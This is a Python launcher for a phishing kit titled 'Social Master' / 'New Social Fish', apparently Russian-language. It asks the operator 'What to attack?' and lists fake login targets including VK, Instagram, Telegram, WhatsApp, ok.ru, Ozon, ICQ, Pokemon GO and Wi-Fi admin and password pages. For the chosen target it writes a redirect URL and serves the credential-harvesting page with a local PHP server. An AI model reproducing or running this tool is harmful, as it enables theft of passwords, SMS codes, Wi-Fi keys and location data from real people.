import os, sys, colorama
os.system("clear")
print("""


\033[32m|-<||====[Social]===================||>-|
\033[32m|-<||\033[33m╔═╗┌─┐┌─┐┬┌─┐┬                 \033[32m||>-|
\033[32m|-<||\033[33m╚═╗│ ││  │├─┤│                 \033[32m||>-|
\033[32m|-<||\033[33m╚═╝└─┘└─┘┴┴ ┴┴─┘               \033[32m||>-|
\033[32m|-<||====================[Master]===||>-|
\033[0m
""")
print("\033[32mStarting...\033[0m")
no = ""
print("""\033[33m
.::|New Social Fish|::.
What to attack?\033[35m
\033[31m[*]\033[35m[1] - ICQ
\033[31m[*]\033[35m[2] - ok.ru
\033[31m[*]\033[35m[3] - Ozon
\033[32m[*]\033[35m[4] - WhatApp
\033[32m[*]\033[35m[5] - Telegram
\033[32m[*]\033[35m[6] - Vk
\033[32m[*]\033[35m[7] - Instagram
\033[32m[*]\033[35m[8] - Other
\033[33m.::|GPS Fish|::.\033[0m
\033[32m[*]\033[35m[9] - Pokemon GO!
\033[32m[*]\033[35m[10] - IG Search account [For mobile]
\033[33m.::|Network|::.\033[0m
\033[32m[*]\033[35m[11] - WI-FI Admin Cp
\033[32m[*]\033[35m[12] - WI-FI Password
\033[33m.::|Other|::.\033[0m
\033[32m[*]\033[35m[13] - Password in head
\033[0m""")
attack = input("\033[32m|-[>>>]:\033[0m ")
if attack == "1":
    attack = "icq"
elif attack == "2":
    attack = "ok"
elif attack == "3":
    attack = "ozon"
elif attack == "4":
    attack = "what"
elif attack == "5":
    attack = "teleg"
elif attack == "6":
    print("""\033[35m
    \033[31m[*]\033[35m[1]: Для спец.кода для авторизации
    \033[31m[*]\033[35m[2]: Для SMS\033[0m
    """)
    vk_inp = input("\033[32m|-[>>>]:\033[0m  ")
    if vk_inp == "1":
        attack = "vk"
    else:
        attack = "vksms"
elif attack == "7":
    print("""\033[35m
    \033[31m[*]\033[35m[1]: Получить ссылку
    \033[31m[*]\033[35m[2]: Получить пароль\033[0m
    """)
    vk_inp = input("\033[32m|-[>>>]:\033[0m  ")
    if vk_inp == "1":
        attack = "inst"
    else:
        attack = "inst2"
elif attack == "9":
    attack = "pokegame"
elif attack == "10":
    attack = "instgeo"
elif attack == "11":
    attack = "wifi"
elif attack == "12":
    attack = "wifipass"
elif attack == "13":
    attack = "pih"
else:
    attack = "other"
ports = input("\033[32m[Enter port]:\033[0m ")
loca = input("\033[32m[Location URL]:\033[0m ")
print("\033[33m")
if loca == "":
    f = open("www/ru/"+str(attack)+"/location.u", 'w')
    f.write("https://google.com")
    f.close()
else:
    f = open("www/ru/"+str(attack)+"/location.u", 'w')
    f.write(loca)
    f.close()

if ports == "":
    ports=8080

os.system("cd www/ru/"+str(attack)+" && php -S 127.0.0.1:"+str(ports))
